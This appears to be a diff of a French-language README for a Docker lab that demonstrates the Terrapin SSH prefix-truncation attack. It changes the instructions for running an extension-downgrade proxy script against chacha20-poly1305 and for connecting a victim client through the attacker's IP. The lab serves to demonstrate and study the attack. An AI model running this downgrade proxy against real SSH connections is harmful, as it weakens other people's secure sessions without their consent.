@@ -18,15 +18,15 @@
 `docker logs terrapin-attack_serveur_1 -f`
 
 ### terminal attaquant
-`docker attach terrapin-attack_serveur_1`
+`docker attach terrapin-attack_attaquant_1`
+## {ip} remplacer par l'ip directement en dehors des {}
 ```
-python3 ext-downgrade/ext_downgrade_chacha20_poly1305.py \
-    --proxy-ip {ip_attaquant} \
-    --server-ip {ip_serveur}
+python3 ext-downgrade/ext_downgrade_chacha20_poly1305.py --proxy-ip {ip_attaquant} --server-ip {ip_serveur}
 ```
 
 ### terminal victime
 `docker attach terrapin-attack_victime_1`
 `PATH="$PATH:/install/bin/"`
-`ssh victim@172.24.0.2 -vvv -o Ciphers=chacha20-poly1305@openssh.com` (passwd is 'secret')
+`ssh victim@{ip_attaquant} -vvv -o Ciphers=chacha20-poly1305@openssh.com` 
+(passwd is 'secret')
 
